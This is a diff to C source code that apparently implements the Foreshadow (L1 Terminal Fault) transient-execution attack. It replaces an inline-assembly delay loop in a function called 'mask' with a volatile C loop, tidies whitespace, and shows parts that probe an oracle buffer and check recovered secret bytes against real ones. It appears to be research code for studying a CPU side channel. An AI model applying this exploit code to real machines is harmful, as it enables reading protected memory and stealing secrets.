@@ -23,7 +23,6 @@
 #include "transient.h"
 #include "rtm.h"
 #include "debug.h"
-
 //#pragma optimize("gt", on)
 #include <stdio.h>
 #include <sys/reg.h>
@@ -46,7 +45,7 @@ int  __attribute__((aligned(0x1000))) fs_dummy;
 char __attribute__((aligned(0x1000))) fs_oracle[ORACLE_SIZE];
 
 /*kmarzouq code*/
- 
+
 void mask (void *adrs, size_t malicious_x){
 
 	int tries, i, j, k, mix_i;
@@ -54,27 +53,14 @@ void mask (void *adrs, size_t malicious_x){
 	//size_t training_x, x;
 	//register uint64_t time1, time2;
     mix_i=0;
-    int loop_count = 320;
     info("Is prob");
     //training_x = FORESHADOW_ZERO_RETRIES % 64;    
 	for (j = 29; j >= 0; j--)
 	{
-            
-
-    
-        asm volatile(
-            "mov %[loop_count], %%ecx \n\t"  // Move loop_count into ECX register
-            "my_loop: \n\t"
-            "    dec %%ecx \n\t"            // Decrement ECX (counter)
-            "    jnz my_loop \n\t"          // Jump to my_loop if ECX is not zero
-            : [loop_count] "+r" (loop_count) // Output/input operand (read and updated by the loop)
-            :                               // No input operands
-            : "%ecx"                        // Clobbered registers
-        );
-		//for (volatile int z = 0; z < 320; z++)  
-		//{
+		for (volatile int z = 0; z < 320; z++)  
+		{
             //transient_access(fs_oracle, adrs, SLOT_SIZE);
-		//}
+		}
         /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 		/* Avoid jumps in case those tip off the branch predictor */
 		//x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
@@ -83,7 +69,7 @@ void mask (void *adrs, size_t malicious_x){
 		}
         transient_access(fs_oracle, adrs, SLOT_SIZE);//transient_access causing issue
     info("Is not prob, %d",mix_i);
-        
+
 }
 
 void foreshadow_init(void)
@@ -152,7 +138,7 @@ int foreshadow(void *adrs)
 
     if (!fs_reload_threshold) 
         foreshadow_init();
-    
+
     /* Be sceptic about 0x00 bytes to compensate for the bias */
     info("adrs is %p",adrs);
     for(j=0; (rv==0x00 || rv==0xff) && j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
@@ -235,4 +221,4 @@ int foreshadow_compare_secret(uint8_t *recovered, uint8_t *real, int len)
         info("[OK] Foreshadow correctly derived all %d bytes!", len);
 
     return rv;
-}
+} 
